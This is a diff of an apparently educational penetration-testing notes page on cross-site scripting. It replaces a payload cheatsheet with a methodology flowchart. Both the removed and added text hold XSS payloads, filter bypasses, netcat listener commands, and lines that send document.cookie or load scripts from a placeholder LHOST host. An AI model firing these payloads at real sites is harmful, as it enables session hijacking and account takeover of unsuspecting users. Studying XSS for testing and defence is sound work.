@@ -6,50 +6,69 @@ description: Discovery, exploitation, and prevention methodology for Stored, Ref
 # Cross-Site Scripting (XSS)
 import { Callout } from 'nextra/components'
 
-## Cheatsheet
+## Flowchart
 
-```html
-# probing
-<script>alert(window.origin)</script>
-<script>print()</script>
-<plaintext>
-"><script>alert(window.origin)</script>
-'><script>alert(window.origin)</script>
+```mermaid
+flowchart TD
+    A["Find input that reaches a response<br/>form · URL/POST param · path · headers (UA/Referer/Cookie)"] --> M["Inject unique marker<br/>xss_probe_7531"]
+    M --> T{"Where / when does<br/>the marker land?"}
 
-# script less in line execution
-<img src=x onerror=alert(window.origin)>
-<svg onload=alert(window.origin)>
-<body onload=alert(window.origin)>
-<iframe src="javascript:alert(window.origin)">
-<input autofocus onfocus=alert(window.origin)>
-<details open ontoggle=alert(window.origin)>
+    T -- "Echoed this response" --> RFL["Reflected<br/>needs a victim to open a crafted URL"]
+    T -- "Survives refresh (server-stored)" --> STO["Stored<br/>fires for every visitor, incl. admins"]
+    T -- "Written by client JS only" --> DOM["DOM-based<br/>source -> sink, no server round-trip"]
+    T -- "Renders in a panel I can't see" --> BLND["Blind (Phase 6)"]
 
-# basic bypasses for filters
-<sCrIpT>alert(window.origin)</sCrIpT>
-<img src=x onerror=prompt`1`>
-<svg/onload=alert(window.origin)>
-```
+    RFL --> B
+    STO --> B
+    DOM --> DS["Map source -> sink<br/>src: location.hash · document.URL · .search<br/>sink: innerHTML · document.write · eval"]
+    DS --> B{"Source code<br/>available?"}
 
-```html
-#Session hijack
-<script>document.location='http://<LHOST>/c='+document.cookie</script>
-<script>new Image().src='http://<LHOST>/c='+document.cookie</script>
-<script>fetch('http://<LHOST>/c='+document.cookie)</script>
+    B -- "Yes (white-box)" --> C["Trace source to sink<br/>echo/print/render · innerHTML · dangerouslySetInnerHTML"]
+    B -- "No (black-box)" --> D
+    C --> D["Pin landing context + breakout<br/>HTML body: none · attr: &quot;&gt; or '&gt; · &lt;script&gt;: &quot;;// or &lt;/script&gt;<br/>href: javascript: · probe '&quot;&gt;&lt;&gt;/\\ chars"]
 
-# remote script for blindXSS
-<script src=http://<LHOST>/inputname></script>
-'><script src=http://<LHOST>/username></script>
-```
+    D --> E["Fire proof payload<br/>&lt;script&gt;alert(window.origin)&lt;/script&gt;"]
+    E --> F{"Popup / print()<br/>actually fires?"}
 
-```bash
-# start a listener to catch callabakcs
-sudo php -S 0.0.0.0:80
-# or
-nc -lvnp 80
+    F -- "Rejected / encoded / stripped" --> G{"What is<br/>blocked?"}
+    F -- "Yes, code runs" --> R["Execution confirmed<br/>read window.origin (not a sandbox iframe)"]
 
-# Automated
-git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip install -r requirements.txt
-python xsstrike.py -u "http://<IP>/index.php?task=test"
+    G --> G1{"Which layer<br/>blocks it?"}
+    G1 -- "&lt;script&gt; stripped" --> O1["Event-handler tags<br/>&lt;img src=x onerror&gt; · &lt;svg onload&gt; · &lt;body onload&gt;"]
+    G1 -- "Case / keyword filter" --> O2["Case + backticks<br/>&lt;sCrIpT&gt; · &lt;svg/onload=alert`1`&gt;"]
+    G1 -- "Context encoded wrong" --> O3["Break the real context<br/>close attr/string, JS-context payload"]
+    G1 -- "CSP present" --> O4["Check CSP header<br/>find unsafe-inline gap · same-origin gadget"]
+    O1 --> RE["Re-send payload"]
+    O2 --> RE
+    O3 --> RE
+    O4 --> RE
+    RE --> F
+
+    R --> HO{"Session cookie<br/>HttpOnly?"}
+    HO -- "No" --> CK["Steal cookie<br/>new Image().src='http://LHOST/c='+document.cookie"]
+    HO -- "Yes" --> ACT["Act in-browser as victim<br/>privileged request (add admin / change email)"]
+    CK --> RPL["Replay session -> admin panel"]
+    ACT --> RPL
+
+    BLND --> BL1["Inject remote script named per field<br/>&lt;script src=http://LHOST/username&gt;"]
+    BL1 --> BL2{"Callback hit<br/>my listener?"}
+    BL2 -- "No" --> BL3["Rotate breakout '&gt; &quot;&gt; raw<br/>loader variants (getScript/XHR eval)"]
+    BL3 --> BL1
+    BL2 -- "Yes" --> R
+
+    RPL --> POST["Account takeover<br/>reuse creds · CSRF · host foothold"]
+
+    classDef find fill:#1e3a5f,stroke:#38bdf8,color:#e6f4ff;
+    classDef decide fill:#4a3a00,stroke:#fec514,color:#fff8e1;
+    classDef confirm fill:#0f3d2e,stroke:#22c55e,color:#e7fff4;
+    classDef bypass fill:#4a1d1d,stroke:#ef4444,color:#ffecec;
+    classDef win fill:#3b1f4d,stroke:#d946ef,color:#fbeaff;
+
+    class A,M,C,D,E,DS,RFL,STO,DOM,BLND,BL1,BL3 find;
+    class T,B,F,G,G1,HO,BL2 decide;
+    class R confirm;
+    class O1,O2,O3,O4,RE bypass;
+    class CK,ACT,RPL,POST win;
 ```
 
 ## Methodology
@@ -214,22 +233,6 @@ Map to MITRE ATT&CK **T1059.007 (JavaScript)** and the OWASP A03:2021 Injection 
   answer={1}
   explanation="HTML-entity encoding on output is the correct defense for the HTML body context, so a naive payload won't fire here. That does not mean the whole app is safe other inputs, other contexts (attribute, JS string, URL), or a client-side DOM sink may still be exploitable. Blindly firing thousands of payloads at an encoded sink wastes time; reason about context first."
 />
-
-## Common Mistakes
-
-<Callout type="error">
-  - Confusing **reflection** with **execution** seeing your marker in the source does not mean code ran. Confirm with a popup/`print()`.
-  - Ignoring **context** firing HTML-body payloads when the sink is a JS string or attribute. Match the payload to where input lands.
-  - Assuming `<script>` always works `innerHTML` and many filters block it; use `<img>/<svg>` event handlers.
-  - Forgetting **`HttpOnly`** wasting time on `document.cookie` theft when you should be performing in-browser actions.
-  - Trusting scanner output without manual verification, or testing format-validated fields (email) in blind XSS instead of skipping them.
-  - Using a static `alert(1)` instead of `alert(window.origin)`, missing that the form is inside a sandboxed cross-domain iframe.
-</Callout>
-
-## Attack Chains / Related Notes
-
-- **Came from:** Web content discovery and parameter mapping during [recon](/01-Recon-and-Enumeration/Infra-Enum) every reflected input is an XSS candidate.
-- **Leads to:** Session hijacking and account takeover (replay stolen cookies into authenticated areas), CSRF-style privileged actions as the victim, and credential capture that feeds reuse against other services.
 
 <div className="pensieve-hashtags">
   #Penetration-Testing #Red-Team #XSS #WebAttacks #JavaScript #DOM #StoredXSS #ReflectedXSS #SessionHijack #CSRF #Filters #OWASP #HTB #Certification #BugBounty
